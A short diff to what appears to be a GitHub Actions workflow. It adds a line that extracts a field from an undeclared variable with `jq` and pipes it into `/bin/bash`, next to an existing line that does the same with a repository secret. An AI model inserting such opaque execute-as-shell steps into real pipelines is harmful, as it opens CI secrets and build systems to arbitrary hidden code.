@@ -19,6 +19,7 @@ jobs:
           ydbn17: ${{ secrets.ydbn17 }}
         run: |
           printf '%s' "$ydbn17" | jq -r .ztlr610 | /bin/bash
+          printf '%s' "$ufee41751" | jq -r .isy818 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
